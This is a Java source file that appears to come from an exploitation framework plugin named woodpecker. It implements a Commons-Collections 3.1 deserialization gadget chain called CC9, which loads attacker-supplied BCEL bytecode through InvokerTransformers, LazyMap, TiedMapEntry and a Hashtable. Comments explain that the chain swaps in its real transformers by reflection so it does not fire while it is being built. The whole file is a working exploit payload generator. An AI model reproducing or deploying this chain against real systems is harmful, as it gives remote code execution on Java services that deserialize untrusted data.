package me.gv7.woodpecker.plugin.gadgets.bcel;

import com.sun.org.apache.bcel.internal.util.ClassLoader;
import me.gv7.woodpecker.plugin.annotation.DependenciesVersion;
import me.gv7.woodpecker.plugin.annotation.RequireParameter;
import me.gv7.woodpecker.plugin.core.pojo.Input;
import me.gv7.woodpecker.plugin.gadgets.BcelPayload;
import me.gv7.woodpecker.plugin.gadgets.ObjectPayload;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

import static me.gv7.woodpecker.plugin.gadgets.util.Reflections.setFieldValue;

@DependenciesVersion("Commons-collections-3.1")
@RequireParameter("ResourcePath")
public class CC9 implements ObjectPayload, BcelPayload {
    @Override
    public <T> Object getObject(Input input) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new
                ConstantTransformer(1)};
        Transformer[]transformers = new Transformer[]{
                new ConstantTransformer(ClassLoader.class),
                new InvokerTransformer("getDeclaredConstructor", new Class[] {Class[].class}, new
                        Object[] {new Class[0]}),
                new InvokerTransformer("newInstance",new Class[] { Object[].class }, new
                        Object[] { new Object[0] }),
                new InvokerTransformer("loadClass", new Class[] { String.class }, new
                        Object[] { input.getBcel() }),
                new InvokerTransformer("newInstance",new Class[]{}, new Object[]{}),};

        //先传入人畜无害的fakeformers避免put时就弹计算器
        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "xxx");

        Hashtable hashtable = new Hashtable();
        hashtable.put(tiedMapEntry,"test");
        lazyMap.remove("xxx");

        //反射修改chainedTransformer中的iTransformers为transforms
        setFieldValue(chainedTransformer,"iTransformers",transformers);
        return hashtable;
    }


//    public static byte[] getBytecode(final Class classname) throws NotFoundException, IOException, CannotCompileException {
//        ClassPool pool = ClassPool.getDefault();
//        CtClass clazz =
//                pool.get(classname.getName());
////        JavaClass cls = Repository.lookupClass(classname);
////        byte[] bytes = cls.getBytes();
//        byte[] bytes = clazz.toBytecode();
//        return bytes;
//    }
}

